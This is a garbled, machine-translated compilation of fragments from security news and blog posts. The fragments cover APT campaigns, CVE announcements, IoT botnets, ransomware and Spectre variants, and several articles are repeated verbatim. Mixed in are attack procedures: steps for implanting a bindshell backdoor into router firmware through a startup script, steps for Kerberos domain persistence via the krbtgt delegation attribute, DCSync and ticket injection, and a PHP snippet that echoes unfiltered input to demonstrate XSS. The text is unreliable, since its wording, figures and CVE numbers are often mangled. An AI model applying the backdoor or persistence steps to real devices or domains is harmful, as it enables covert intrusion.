If you encounter problems in the process of configuring the cross-compilation environment, please refer to the MIPS cross-compilation environment building guide. It is not found that the environment has been deployed in attifyOS until the environment building is completed
After a period of compilation, an output file is added to the root directory of the Buildroot, containing the already compiled file
Implement the mipsel-linux-gcc- -version view version to compile the above backdoor file bindshell.c into a binary file capable of embedding the file system
Select the location to place the backdoor binary: / rootfs / etc / templates Call the backdoor binary in the / etc/scripts/system.sh script bindshell: (the article was written before, without a picture, the hard disk is not taken) finally use build-firmware.sh to repackage the modified file system into a new firmware package

The first reaction to getting this packet, the previous penetration testing experience tells me that there will probably be a file reading vulnerability from this place
4105: " Background Since April 2018, an APT organization blind Eagle (APT-C-36) has launched organized, planned and targeted long-term uninterrupted attacks on important areas such as Colombian government agencies and large companies (finance, oil, manufacturing and other industries)
Its attack platform is mainly Windows, and the target is Colombian government and enterprise organizations. Up to now, Qianxin Threat Intelligence Center has captured a total of 29 targeted bait documents, 62 Trojan samples of Windows platform, and a number of related malicious domain names
In April 2018, the Qianxin Threat Intelligence Center captured the first targeted attack sample against the Colombian government, and since nearly a year, we have captured a number of targeted attacks against Colombian government and enterprise agencies
The attacker is used to encrypt the Office Word bait document in MHTML format with malicious macros and deliver the target through RAR with harpoon mail, and then put the RAR decompression password attached to the body of the mail, which has a good effect of avoiding the mail gateway detection
Since one of the special targets of the organization is the Columbia Institute for the Blind, also known as the South American Eagles in the field of football, combined with some other characteristics of the organization and the naming rules of the Threat Intelligence Center for APT organization, we named the Blind Eagle (APT-C-36)
After classifying the victims according to the associated samples, we found that the attackers mainly targeted Colombian government agencies and large companies, aiming to implant Imminent backdoors to achieve control of the target computer and provide the basis for subsequent attacks such as lateral movement
Based on the analysis of harpoon mail, we listed the following targeted bait documents and the corresponding government and enterprises
The attacker also carefully constructed the content of the email, so that it seems to be derived from the forged institution, and it is related to the daily work and life of the victim
The following image is the translation of the corresponding message in an attack on the ATH Columbia division: The attachments are encrypted in a compressed package, and a decrypted password is provided in the text of the message to bypass the security detection of the email gateway

There is also a bizarre vulnerability that is related to the notorious October update (1809), where attackers can use the October update in physical contact, and the November update where hackers can use the October update
The most important point of this update is to fix the previously exploited 0day vulnerability: CVE-2018-8589, which was discovered by Kaspersky Lab and is said to have been exploited by multiple APT organizations
The vulnerability is a vulnerability vulnerability, which affects the Win32k components in the system. After the APT organization finds the method to invade the target device (presumably not complicated)
This is also the second vulnerability repaired in recent months, and CVE-2018-8453 repaired last month was also used by FruityArmor
Although there is good news, there is still bad news: the 0day vulnerability revealed on Twitter has not been fixed (the one that can delete files, although it can delete sensitive files and WAF, but it still doesnt do much)
This is also in order to deal with the day before the hard disk encryption bypass vulnerability, including Samsung EVO and other classic models will be affected

If the SID of a user account is set in the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the krbtgt account (the procedure will be detailed below), Then any account can obtain the TGS (Ticket Granting Service) for the KDC (Key Distribution Centre) service, Finally obtain a valid TGT (Ticket-Granting Ticket), This also means that the attacker has successfully obtained a gold note (Golden Ticket)
Using this account, an attacker can perform the following steps: 1. Find a user account with an SPN and whose password will never expire
Figure 1. Use the PS command to obtain the qualified service account. 2. Use the "DCSync" function in many attack security tools (such as Mimikatz) to extract the corresponding hash for this account
In order to regain the administrator permission, the attacker will use the svc-backdoor account to perform the following three steps: 1. Trigger the backdoor to apply for TGT for any account. Here we take the administrator account as an example
2. After obtaining the TGT, the attacker can obtain the TGS of CIFS and LDAP service on the domain control for the counterfeit account (here administrator), and then inject these TGS into the current session
Recently, security researchers of 360 Enterprise Security Group Code Guard team found a number of high-risk security vulnerabilities (CVE-2018-3245, CVE-208-2018-3248, CVE-2018-3249, CVE-2018-3252), and reported to Oracle immediately to help them repair the vulnerabilities
Oracle WebLogic Server Is currently one of the most widely used commercial application middleware of J 2 EE in the world
Oracle 360 Code Guard, CVE-2018-3245 and 3245 CVE-2018-3252 are high-risk counter serialization vulnerabilities, affect multiple WebLogic versions, CVSS score of 9.8 points, under certain conditions, can cause remote code execution

Then the non-absolute address string that returns will buffer overflow in the realpath() function, resulting in arbitrary code execution, and then the SUID program can obtain root privileges on the target system
Last week, Linux kernel fixed four CVE vulnerabilities [1], among which CVE-2019-11477 feels like a very powerful Dos vulnerability, but because there are other things interrupted, so the speed of progress is relatively slow, during this period, there have been relevant analysis articles on the Internet
[2][3] In the process of trying to reproduce the CVE-2019-11477 vulnerability, I encountered the problem of setting the MSS in the first step, and could not achieve the expected effect. However, the current public analysis articles have not analyzed the content of this part in detail
4069: " Magnitude EK is one of the longest-used browser vulnerability utilization toolkits
In 2017, Magnitude delivered Cerber ransomware to a handful of Asian countries through a network filter called "Magnigate"
In October 2017, the operators of the vulnerability exploit kit began using it to distribute their own ransomware, "Magniber"
The change brings an interesting twist. ¡ª¡ª malware developers are putting all their energy into infecting South Korean users
In April 2018, Magnitude unexpectedly started to push for the growing GandCrab ransomware, and soon began the use of the new Flash zero-day vulnerability (CVE-2018-4878)
In our recently captured Magnitude, we saw the latest Internet Explorer vulnerability (CVE-2018-8174) being mainly used, which Magnitude integrates after only a week of traffic disruption
Moreover, while Magniber has previously been targeted only at South Korea, it has now expanded its target range to other Asia-Pacific countries

Earlier, the film lab also found some attacks on the organizations related accounts, and found that the organization used vulnerabilities to study related content to build account trust to further identify targets and launch attacks
Among them, the 0Day vulnerability CVE-2021-33739 we observed in May this year is a very attractive material
The Lazarus organization has long used backdoors and remote access trojans to attack security researchers
In early 2021, the researchers revealed that Lazarus organizations had conducted cyber attacks against security researchers under the guise of vulnerability research partnerships
Recently, Lazarus has again trying to attack security researchers with a trojized version of the popular IDA Pro reverse engineering application
The payload is considered the NukeSped RAT remote control Trojan previously used by Lazarus organizations, allowing attackers to access the researchers device through the installed RAT, thus to steal files, intercept screenshots, record keystrokes, or execute further commands
When the Shadow Lab captured an unknown windows kernel 0day sample in May (later CVE-2021-33739), it discovered that a user named "mavillon1" posted a similar code on github, and we were skeptical about using "mavillon1"
In conclusion, the hunting shadow lab attributed the CVE-2021-33739 in May 2021 to the Lazarus organization with high confidence, and the detailed analysis of the vulnerability can be moved to the reference link
Critical infrastructure attacks are, in my opinion, a threat to the 911
In March, aluminum giant Norsk Hydros global IT network was maliciously attacked, and automated production lines were shut down. In June, Irans oil, financial and even military missile launch and control systems were repeatedly paralyzed by cyber attacks of unknown sources
In July, the Venezuelan hydropower station was attacked by a network, and the capital and more than 10 states collapsed, and the whole country fell into a dark moment; in October, the computer network of Indias largest Kudankulam nuclear power plant was attacked by outsiders, endangering the power supply in southern India; in December, the RavnAir computer network of American Airlines was subjected to malicious attacks, and the flight cancellation system was forced to stop
Chemical industry, energy, finance, power grid, water plant, nuclear power plant, transportation and military and other fields of key infrastructure, in 2019 all become the bulls eye, and from the result, for the key infrastructure attack, its threat has become the damage to national security, political stability, economic lifeline, the important existence of citizen security
(The "low visibility slow" attack in Akamai reports) A typical case of a credit agency experiencing such an attack in 2018, when a cunning attacker attracted the attention of the agency with a huge botnet, while using other botnets
Recently, cyber security company CyberX found that cyber spy groups had used malware to attack multinational industrial companies, including a large South Korean company producing critical infrastructure equipment
In my guess, the attackers control (C & C) server used free hosting services, making it harder to track
Back in 2004, the United States paralyzed Libyas national top-level domain name in a cyber attack on Libya
When the political crisis broke out in Venezuela, a cyber attack on key infrastructure, such as the water grid, led to "paralysis" and many riots across the country, and Venezuela was unable to blame the power cuts for "elaborate cyber attacks by the United States"
A decade ago, the earthquake network ravaged Irans nuclear industry with devastating attacks. In recent years, Venezuela and other South American communities have suffered from power attacks
The emergence of new technologies has continuously expanded the scope of critical infrastructure attacks, and the resulting fragmented attacks have further increased the security threats

We continuously tracked this batch of samples, and conducted a comprehensive analysis, and found that it was the latest activity of icedid, and in this activity, the attacker newly created a malware loader Gziploader
The samples became heavily active in mid-March 2021, with a large sample number, mainly through spam or phishing mail dissemination
In the development process, the attacker uses various techniques of hiding malicious code, like setting the font of the macro code with the same background color, setting the code location is located in the middle and back section of xlsx file; using xlsx file as downloader, and the downloaded malicious file will decrypt another Dll component and load it in memory to realize no file attack; the API call is dynamically loaded by comparing hash values, so the traditional detection method is difficult; the memory load decrypts C2 address from the embedded data to download and execute the subsequent components
We combed through the historical activities of icedID: 1.icedID first appeared in 2017 and was later operated by Lunar Spider
2. Subsequently, multi-factor authentication solutions emerged at banks, which forced icedID to seek new ways to profit
3. icedID, which changed its operational strategy, turned its malware into a "downloader."
7.IcedID is used to deploy the REvil (Sodinokibi) ransomware
icedID Front load information combing is different from previous activities, this time the captured attack event, the attacker used macro 4.0 technology, delivered a large number of phishing documents in a short period of time, we compare the macro code: the attacker used macro code is basically the same: 1. by setting the macro code font with the background color, make the malicious code invisible hidden macro code; 2. download the subsequent malicious files and execute

4023: The Background The Maha Grass Organization (APT-C-09), also known as HangOver, VICEROY TIGER, The Dropping Elephant, Patchwork, is an overseas APT organization from South Asia that has been active for eight years
Maha Grass, which was first exposed by Norman Security in 2013, conducts cyber espionage activities against China, Pakistan and other countries in Asia and countries
Among the attacks on China, the group has mainly targeted government institutions, scientific research and education fields
Around the Spring Festival of 2018, Qianxin Threat Intelligence Center and Security Monitoring and Response Center assisted users to deal with a number of very targeted harpoon mail attacks, and found a large number of delivered harpoon mail in the customer mail system, and the attacked units were some important and sensitive government agencies
After traceability analysis and association, the gang behind is Magrass tissue (APT-C-09)
Around the Spring Festival of 2018, some important and sensitive government agencies received some harpoon emails with links, inducing users to click on the link to download and open the Office document with vulnerabilities. Once the user downloads and opens the document, they will promote the vulnerability and continue to download the remote control Trojan to control the users computer for a long time
An attacker sends email messages related to his work, And induce the target to download the attachment documents through the link in the email, Some of the harpoon mail is as follows: The downloaded document is the Office vulnerability document of CVE-2017-8570, In January 2018, field samples using CVE-2017-8570 (see reference [1] for details), As the vulnerability compensates for the innate deficiency of CVE-2017-0199, You can see that after the vulnerability Exploit was made public, It was immediately incorporated into the Maha grass APT tissue
Sample analysis sample execution process target users once Office document download and open through the link in the email, will trigger vulnerability and execute malicious script, malicious script will continue to download execution remote control Trojan, and filter specific target continue to issue execution specific Trojan module, the whole sample execution process is as follows: vulnerability document (CVE-2017-8570) analysis the downloaded back for CVE-2017-8570 vulnerability document (see reference [1] for detailed analysis of vulnerability)

4018: Rebind Technology sends a malicious X-Forwarded-Before request to a local server, meaning that it is possible to execute arbitrary code on the victims computer
If the server opens the Xdebug back and the attacker can directly access the server, it can directly cause RCE
When the victim visits the malicious page of the attacker, the attacker can let the victim try to request the local url such as header CORS in the browser, and they need to send a preflight request probe server to allow this request header
However, the attacker can use the DNS Rebind method to bypass this limitation
The attacker first built a DNS resolution server, so that the domain name he controls points to the attackers server during the first DNS resolution, and then all parses to 127.0.0.1
In the paper, the author conducted a systematic study of hundreds of FIPS 140-2 certified application ANSI X9.31 random number generator, and found that 12 of them used a static hard-coded key, and the attacker could obtain the key from the source code or binary file
To demonstrate the utility of this attack, the author performs a completely passive decryption attack on the FortiGate VPN gateway using FortiOS v4, restoring the private key in a few seconds
In recent years, many random number generators of cryptographic systems have been found to be defective or maliciously implanted into backdoors
For example, Edward Snowden leaked documents indicate that the NIST Dual EC DRBG standard may be designed with backdoors
In 2015, Juniper revealed that their ScreenOS series VPN devices had been modified to include a set of malicious dual EC parameters that led to passive decryption of VPN sessions
4. X9.31 The NIST design description of the random number generator does not specify how the packet password keys should be generated or stored
This paper conducts a systematic study on the security strategies for X 9.31 PRG certified products to understand how many vendors have publicly documented potential hard-coded key vulnerabilities
However, the TLS DH key exchange is a temporary static Diffie-Hellman, which is generated after each restart until shutdown. It is not easy to attack the server for direct key recovery
4016: "I. Overview" Due to defects in the way WordPress handles permissions, they may occur in the WordPress plug-in
This vulnerability allows store administrators to remove certain files on the server while being able to take over any administrator account
In most cases, any file deletion vulnerability is not considered a critical issue, as an attacker uses the vulnerability to delete the sites index.php, leading to a denial of service
Currently, 4 million WooCommerce stores are affected by the vulnerability
An attacker can obtain such permission through an XSS vulnerability or a phishing attack, and once exploited, the store manager can take over any administrator account and then execute code on the server
We automatically detected the file deletion vulnerability using the SAST solution, please refer to: IV. Report any file deletion vulnerability on August 30,2018 to Automattics Automattic security team on September 11,2018. The vulnerability was classified by the security team and verified that the patch was released on October 11,2018
5. Summary in previous articles, we demonstrated how to exploit the file deletion vulnerability in WordPress and how to upgrade a file deletion vulnerability to a remote code execution vulnerability
The method proposed in this paper mainly takes advantage of the file deletion vulnerability in the WordPress plug-in to achieve permission enhancement for metapermission
File deletion vulnerabilities are not uncommon and may even occur in the core parts of WordPress
In some cases, file deletion vulnerabilities can also be exploited by Phar deserialization
 As early as June 2018, the CNVD website reported that the DCCE MAC1100 PLC had an arbitrary program coverage vulnerability, which was numbered CNVD-2018-19112
DCCE MAC1100 PLC There is an arbitrary program coverage vulnerability, because the MAC1100 PLC programmable logic controller does not verify the relevant rights when downloading the program from the PLC. The attacker can download the program packets remotely
3. In conclusion, the author inquired the relevant vulnerabilities of DCCE PLC in the CNVD industrial control vulnerability column, and concluded that most of the vulnerabilities of this product are derived from the unauthorized access of PLC
According to the relevant learning experience of industrial control security, not only DCCE PLC has such problems, but also Siemens, Schneider and other brands of products, including the mainstream industrial control protocol of the current market, also have similar loopholes
4011: " If you think youre in a spear phishing attack, the solution is very simple: dont panic! Opening only e-mails containing malicious attachments or links will not affect your computer
After a data breach, there are often attacks and fraud, and businesses and individuals should be prepared for that
1. Background 1.1 Remote control Trojan online methods There are several ways: ¡¤ Active connection to the charged terminal opens the specific port after execution, and the attack terminal is connected to the controlled terminal through the host IP and port
1.2 What is a Air GrappingWikipedia: " An air gap, air wall or air gapping is a network security measure employed on one or more computers to ensure that a secure computer network is physically isolated from unsecured networks, such as the public Internet or an unsecured local area network. " In simple terms, Air Grapping Is one used to protect specific networks, Security measures using physical isolation, It is usually used to prevent the intrusion events and information leakage events caused by the network connection route
However, there is no absolute, some big news tells us that using malicious USB is an operational way to attack
Stuxnet Worm The famous shock net virus uses USB to transmit the virus into the isolation network, and then spreads the virus to other devices in the network
Give the wrong instruction to the industrial control machine at the appropriate time, resulting in abnormal machine until scrap
The virus has to delay Irans nuclear program for at least two years
When it is inserted into the target host, it implants a malicious program and creates a wireless bridge, and the supporting device can interact with it through RF signals and transmit commands and data
Similarly, it was used by the NSA to attack Irans secret agencies, stealing data from physically isolated equipment for several years
2. Ghost Tunnel The attack on isolated networks generally has two steps: implant malware in the target system to establish a data channel, (infiltrate & exfiltrate), in order to execute commands and steal data
At this point, the attacker can remotely execute commands and steal data
Among them, the combination of CVE-2020-14882 / CVE-2020-14883 can enable unauthorized attackers to bypass the restrictions of WebLogic background login and other, and finally remote code execution to take over the WebLogic server, which is very low difficult to use and great risk
Vulnerability number CVE-2020-14882, CVE-2020-14883 vulnerability level high risk, CVSS score 9.8 affected version 10.3.3.6.0.0,12.1.3.0.0,12.2.1.3.3.0,12.2.1.4.0,14.1.1.1.0.0 The Oracle official CPU has released a patch for the vulnerability, please affected users download the patch and install the update

The last article introduces how to use Firmadyne for firmware simulation. Firmadyne is based on QEMU virtual machine. This tool can simulate the system architecture of the entire firmware package and run the firmware. This article mainly describes the process of repackaging the firmware package after tampering
0X02 extraction firmware system FMK introduction: firmware tampering process will use FMK tool-firmware-mod-kit, the tool can use binwalk tools to extract file system from the firmware, the proposed file system content, and then repackaged into a new firmware package, finally the tampered firmware package refresh the device, the installation command as follows, the tool attifyOS system has been deployed, no further details
Looking at the folder content, you can see that the rootfs directory contains a complete file system, which is the main location to add a backdoor
0X03 ARM, MIPS, X86 architecture introduction to add backdoor programs need to see the firmware based on architecture, such as the mainstream ARM and MIPS architecture: ARMARM is advanced lean instruction set (Advanced RISC Machine), it is a 32-bit streamline instruction set architecture, but also equipped with 16 bit instruction set, generally than equivalent 32 bit code save 35%, but can keep all the advantages of 32-bit system
The Load _ store structure: In the RISC, all the calculations are required to be done in a register
In the CSIC, the CPU can directly operate on the memory
MIPSMIPS Architecture (English: MIPS architecture, For the abbreviation of Microprocessor without interlocked piped stages architecture, Also related to Millions of Instructions Per Second), Is a processor architecture with a reduced instruction set (RISC), Appeared in 1981, Developed and licensed by MIPS Technologies, It is widely used in many electronic products, network equipment, personal entertainment devices and commercial devices
If you encounter problems in the process of configuring the cross-compilation environment, please refer to the MIPS cross-compilation environment building guide. It is not found that the environment has been deployed in attifyOS until the environment building is completed
After a period of compilation, an output file is added to the root directory of the Buildroot, containing the already compiled file
Implement the mipsel-linux-gcc- -version view version to compile the above backdoor file bindshell.c into a binary file capable of embedding the file system
Select the location to place the backdoor binary: / rootfs / etc / templates Call the backdoor binary in the / etc/scripts/system.sh script bindshell: (the article was written before, without a picture, the hard disk is not taken) finally use build-firmware.sh to repackage the modified file system into a new firmware package
A Brazilian Internet service provider has deployed unTelnet password routers for nearly 5,000 users, making them very vulnerable to abuse
Mr.Ankit Anubhav, a lead researcher at the Internet of Things security company NewSky Security, discovered the devices
All exposed devices are Datacom routers provided to users by Internet service provider Qi Internet
Anubhav Represents that three Datacom routers are susceptible: DM991CR, DM706CR and DM991CS
Although Telnet passwords are set on some devices, most devices can allow anyone to connect to a router and change their configuration
Anubhav said, " This is not a device architecture issue, but a configuration issue where the devices telnet is exposed
"He also points out that one of the routers manuals notes that these devices do not set a Telnet password by default, which means users have to configure it themselves
Qi Internet The company has yet to comment
The researchers said they had informed the Brazilian CERT of the problem and asked the Brazilian CERT to inform Internet service providers of the results and provide a solution to protect the exposed equipment
For attackers, taking over these routers is a piece of cake, because they can write automatic scripts to exploit the lack of Telnet passwords to incorporate exposed routers into the botnet
Anubhav Explanation, " IoT attacks can be reduced to three levels: 0 (attacking the device without authentication), 1 (guess weak / default password) and 2 (access with the IoT utilization code)
"He also pointed out that" although the Internet of things attackers over time become more and more complex, NewSky security companies found level 2 attacks is also increasing, but we still observed that the most easy attack vector (in the case of no authentication control equipment level 0 attack) is still very relevant in 2018, because the device everyone even in the case of no password will device exposure
"Anubhav added," Setting strong passwords and continuously updating IoT devices limits an attackers ability to use 0 days or lengthy violent sessions, but for most attackers, neither method is a very tempting option, so the device is secure

What is shocking is that using brute force to guess that the password is the most common attack method for criminals, accounting for 93% of the hacker attack methods used, and the router is the most commonly used type of device to attack the Internet of Things gateway 
David Amm, a Kaspersky security officer, said, " This study should be a wake-up call for those who believe that Internet of Things devices seem insufficient to attract the attention of cyber criminals and will not be a target for malicious activity
However, other motives for attacking IoT devices include aiming to shut down competing malware, fixing vulnerabilities in installed malware and closing vulnerable services on the device so that other malware cannot use security vulnerabilities
As a result, ioT products have become an easy target for cybercriminals, who can turn simple machines into powerful devices for illegal activities, such as espionage, theft, extortion, and distributed (DDoS) attacks

3250: Ransomware is still one of the biggest methods of cybercrime and one of the biggest threats faced by businesses today
Ransomware is a specific type of malware, and its data is the most valuable resource for an organization
In recent years, it has become a common threat, as networks are increasingly exposed to additional vulnerabilities in the form of mobile and Internet of Things (IoT) devices, as well as improved phishing and social engineering technologies
Unlike other threats, ransomware can indicate its identity to the victim
If cryptocurrencies as a whole, attackers could be more likely to return for ransom than mining
Even if encryption is always more lucrative than ransomware, that doesnt mean that ransomware will disappear
Malicious attackers often use multiple threats to the victim to see how the victim is vulnerable
To defend against ransomware, companies need to be particularly vigilant about upgrades, updating and maintaining their threat detection technology
3255: " Security personnel recently discovered a new side channel attack against Intel processors, which is a serious security issue after the Meltdown, Spectre and Foreshadow
This vulnerability allows an attacker to obtain the data being processed by the current processor
This vulnerability was jointly found by some security personnel who participated in Meltdown and Spectre vulnerability research and Bitdefender security personnel. It was actually a microarchitecture data sampling (MDS) attack, and can infer other data processed in the processor by using the speculative execution operations in the microarchitecture
There are four types of these (MDS) attacks, namely attacks against storage buffer (CVE-2018-12126 / Fallout), loading buffer (CVE-2018-12127), row fill buffer (CVE-2018-12130 / Zombieload / RIDL), and memory area (CVE-2019-11091)

3354: Last week, six scientists from Ohio State University unveiled a new variant of the Spectre attack, SgxSpectre, which can extract data from the Intel SGX package
The Meltdown and Spectre attacks announced earlier this year in the year can cause attackers to break the isolation between the operating system and apps and within the app, causing malicious attackers to retrieve information from the operating system kernel or other apps
The researchers say the SgxSpectre attack worked because the specific code patterns present in the software library allow developers to add SGX support to their applications
The vulnerable SGX development packages include Intel SGX SDK, Rust-SGX as well as Graphene-SGX
It is typically a typical "side channel attack" and is very effective
Because there are vulnerable code patterns that are difficult to clear, the attacker can launch a SgxSpectre attack against any encapsulated program
"The research team also noted that," Due to the vulnerable code patterns in the SDK operating environment library, any code developed through the Intel official SGX SDK is affected by the attack, regardless of how the encapsulation program is executed
In addition to SgxSpectre, the researchers disclosed two variants of Meltdown and Spctre attacks, namely MeltdownPrime and SpectrePrime
The researchers are titled MeltdownPrime and SpectrePrime: Automated synthetic attacks using futility-based consistency protocols"

3452: The vulnerability lets an attacker in Facebooks tapprd.legal.thefacebook. The com server (Server-Side) performs HTML code for remote code execution (RCE)
By this way, There are multiple ways to delegate to RCE: 1. Since there is another vulnerability in the Web application server, I can get the internal system path to the Web app through it, Then then extract the web.config file, To get more sensitive configuration information about Web applications; 2. After scanning for the internal network of the Web app, I found some of these WebLogic server systems that are internal-only; 3. After testing a different URL method, I found out that after using the "about: / /" format method, An IE page in the PDF file lists all the menu options and IE versions
Because Im not familiar with ASP.NET, but I wondered, did the Web app use some kind of Windows API interface on the HTML page in IE? And does that HTML page include a Javascript code for screenshots or document conversion, similar to the open source PDF document generation tool jsPDF? Under this assumption, I try to embed some Payload attack loads against IE (for confidentiality reasons, sorry not much detail here)
With the above three ways to implement RCE, the last step is how to execute the attack. Coincidentally, I found that there is a Facebook email forgery vulnerability in the Web application system, so the combination of the two can form the maximum power

Fortinet The published data covers all botnet type information for desktop, mobile, server, Internet of Things and network devices
The longest duration of each zombie infection is Mirai for IoT devices
It is commonly used to launch DDoS attacks and traffic proxy services
Other botnets following Mirai are Sality (spam and agents), Ramnit (bank Trojan), H-word (download), Necurs (spam), etc
In the first quarter of 2018, the relatively new "malware downloader" Gh0st malware was the most common botnet, which infected victims and rented out infected computers to other criminals
In the first quarter of 2018, Gh0st was by far the most widely spread botnet malware, ranking first among all types, followed by Pushdo spam botnet and Andromeda botnet
The reason is that the source code of Andromeda was leaked to the Internet a few years ago; although the original botnet was taken, other criminals installed and ran new Andromeda botnets within a few days. Overall, the botnet was declining in the first quarter of 2018, most of them lost zombies, turned down, or less active than in the previous quarter (the red arrow abundance shown in the table below

With access, the threat actor can access the compromised server, steal data, and deploy a phase 2 malware payloads
Oracle Fix the CVE-20202-14882 remote execution code vulnerability in the critical patch update in October
A week after the patch was released, the attacker was scanning for WebLogic Server exposed on the Internet
On November 1, Oracle released an emergency security update to fix another remote execution code vulnerability affecting WebLogic Server CVE-2020-14750
An unauthenticated remote attacker can exploit the vulnerability to take over unrepaired instances
The attacker is using base64-encoded Powershell scripts to download and install Cobalt Strike payloads on an unfixed Oracle WebLogic Server
Cobalt Strike Deployment An analysis reported that 66% of ransomware attacks in the third quarter of 2020 involved the Red Team tool Cobalt Strike, indicating that ransomware players increasingly rely on the commercial Trojan as they abandon it
Given the low difficulty to exploit of CVE-2020-14882 and CVE-2020-14750 that can be used by unauthenticated attackers to take over vulnerable WebLogic Server, the vendor has advised users to immediately apply security updates to prevent attacks

3171: " In the first half of 2018, the number of IOT malware tripled
Attacks become increasingly complex as hackers realize the financial opportunity to get into network devices
One of the biggest problems facing the Internet of Things at this stage is malicious cryptocurrency mining, attacks such as DDoS attacks and botnet activities are becoming increasingly common, and the security of the Internet of Things is being challenged
What is shocking is that using brute force to guess that the password is the most common attack method for criminals, accounting for 93% of the hacker attack methods used, and the router is the most commonly used type of device to attack the Internet of Things gateway 
David Amm, a Kaspersky security officer, said, " This study should be a wake-up call for those who believe that Internet of Things devices seem insufficient to attract the attention of cyber criminals and will not be a target for malicious activity
However, other motives for attacking IoT devices include aiming to shut down competing malware, fixing vulnerabilities in installed malware and closing vulnerable services on the device so that other malware cannot use security vulnerabilities
As a result, ioT products have become an easy target for cybercriminals, who can turn simple machines into powerful devices for illegal activities, such as espionage, theft, extortion, and distributed (DDoS) attacks

3250: Ransomware is still one of the biggest methods of cybercrime and one of the biggest threats faced by businesses today
Ransomware is a specific type of malware, and its data is the most valuable resource for an organization
In recent years, it has become a common threat, as networks are increasingly exposed to additional vulnerabilities in the form of mobile and Internet of Things (IoT) devices, as well as improved phishing and social engineering technologies
Unlike other threats, ransomware can indicate its identity to the victim
If cryptocurrencies as a whole, attackers could be more likely to return for ransom than mining
Even if encryption is always more lucrative than ransomware, that doesnt mean that ransomware will disappear
Malicious attackers often use multiple threats to the victim to see how the victim is vulnerable
To defend against ransomware, companies need to be particularly vigilant about upgrades, updating and maintaining their threat detection technology

3354: Last week, six scientists from Ohio State University unveiled a new variant of the Spectre attack, SgxSpectre, which can extract data from the Intel SGX package
The Meltdown and Spectre attacks announced earlier this year in the year can cause attackers to break the isolation between the operating system and apps and within the app, causing malicious attackers to retrieve information from the operating system kernel or other apps
The researchers say the SgxSpectre attack worked because the specific code patterns present in the software library allow developers to add SGX support to their applications
The vulnerable SGX development packages include Intel SGX SDK, Rust-SGX as well as Graphene-SGX
It is typically a typical "side channel attack" and is very effective
Because there are vulnerable code patterns that are difficult to clear, the attacker can launch a SgxSpectre attack against any encapsulated program
"The research team also noted that," Due to the vulnerable code patterns in the SDK operating environment library, any code developed through the Intel official SGX SDK is affected by the attack, regardless of how the encapsulation program is executed
In addition to SgxSpectre, the researchers disclosed two variants of Meltdown and Spctre attacks, namely MeltdownPrime and SpectrePrime
The researchers are titled MeltdownPrime and SpectrePrime: Automated synthetic attacks using futility-based consistency protocols"
3356: Cybersecurity company Proofpoint has observed a spear-phishing campaign for the marketing, advertising, public relations, and retail and manufacturing industries, with the attackers spreading a new type of malware called Vega Stealer
As one of the features of the malware, it was able to steal login and credit card credentials saved by victims from Chrome and Firefox browsers
In addition to its ability to steal credentials, it can also steal sensitive documents from infected computers
Vega Stealer Is considered a variant of the malware August Stealer, which includes some features of the latter, but also adds some important new features
Originally discovered in December 2016, August Stealer was able to steal passwords stored in its Skype, Opera, Chrome and Firefox browsers, as well as the ability to steal data and other sensitive documents from infected computers
Cybersecurity company Proofpoint said it discovered and blocked a small batch of malicious email distribution on Tuesday (May 8), including topics like "need online store developers."
The email contains a malicious attachment called "brief.doc" with a malicious macro embedded to spread Vega Stealer
Proofpoint The researchers also stressed that the malicious macro used in the event was a commodity macro and that he had been used by different cyber crime groups in multiple attacks, including gangs that spread the Emotet Bank Trojans

3452: The vulnerability lets an attacker in Facebooks tapprd.legal.thefacebook. The com server (Server-Side) performs HTML code for remote code execution (RCE)
By this way, There are multiple ways to delegate to RCE: 1. Since there is another vulnerability in the Web application server, I can get the internal system path to the Web app through it, Then then extract the web.config file, To get more sensitive configuration information about Web applications; 2. After scanning for the internal network of the Web app, I found some of these WebLogic server systems that are internal-only; 3. After testing a different URL method, I found out that after using the "about: / /" format method, An IE page in the PDF file lists all the menu options and IE versions
Because Im not familiar with ASP.NET, but I wondered, did the Web app use some kind of Windows API interface on the HTML page in IE? And does that HTML page include a Javascript code for screenshots or document conversion, similar to the open source PDF document generation tool jsPDF? Under this assumption, I try to embed some Payload attack loads against IE (for confidentiality reasons, sorry not much detail here)
With the above three ways to implement RCE, the last step is how to execute the attack. Coincidentally, I found that there is a Facebook email forgery vulnerability in the Web application system, so the combination of the two can form the maximum power

3517: Last week, Fortinet released its first quarter 2018 Threat Situation report, indicating that most botnet malware was infected for less than a day
Fortinet The published data covers all botnet type information for desktop, mobile, server, Internet of Things and network devices
The longest duration of each zombie infection is Mirai for IoT devices
It is commonly used to launch DDoS attacks and traffic proxy services
Other botnets following Mirai are Sality (spam and agents), Ramnit (bank Trojan), H-word (download), Necurs (spam), etc
In the first quarter of 2018, the relatively new "malware downloader" Gh0st malware was the most common botnet, which infected victims and rented out infected computers to other criminals
In the first quarter of 2018, Gh0st was by far the most widely spread botnet malware, ranking first among all types, followed by Pushdo spam botnet and Andromeda botnet
The reason is that the source code of Andromeda was leaked to the Internet a few years ago; although the original botnet was taken, other criminals installed and ran new Andromeda botnets within a few days. Overall, the botnet was declining in the first quarter of 2018, most of them lost zombies, turned down, or less active than in the previous quarter (the red arrow abundance shown in the table below

Almost all of us use the phones scanning function, but have you ever wondered what would happen if your trusted app APP had a security error? Today, were going to talk about the code-scanning XSS vulnerability in the Firefox IOS v10 browser
The following is a GIF of Firefox IOS v10 scanning code to visit the website: construct XSS with javascript URI so, here how to find the vulnerability of its scanning code function? The first thing I think of is to construct a javascript URI form to replace the URL in the QR code, to see how to judge the scanning code function, and whether it will be executed as normal text or as javascript code
Local file loading process of XSS trigger can use the vulnerability to trigger some phone local file loading, scan code, there is a local file, file:///test.html, for example: inline page loading process XSS trigger in pseudo protocol internal: / / page loading process form XSS, such as: CSP bypass the vulnerability can also be used to bypass the CSP limit, such as a website limited to access to come from its own content, such as the following code scenario: / / test.php <?php header(\"Content-Security-Policy: default-src self\"); if(isset($_GET[xss])) { echo $_GET[xss]; } ?> So even with this limitation, the QR code javascript code we constructed can also run unlimited
In addition to Firefox, Opera mini for IOS also has the XSS vulnerability, we have informed Opera officials, but they have not responded so far
After reporting it to the Firefox, they removed the javascript URI function from the address bar in time, and the vulnerability was also assigned to CVE-2019-17003

The threats to hackers, viruses, malware and data breaches arent disappearing ¡ª theyre evolving, and there are more ahead as we approach 2019
1 ransomware So far, ransomware has been a major threat to cyber security in the past few years
The ransomware controls the computer or computer network and bans its use by completely locking the end users (unless a ransom is paid)
By doing so, cyberattackers can easily extort dazzling money from their victims
But is it really as scary as you think? Whats more, the widespread adoption and use of cryptocurrencies and the Internet of Things (IoT) devices has made ransomware even more popular
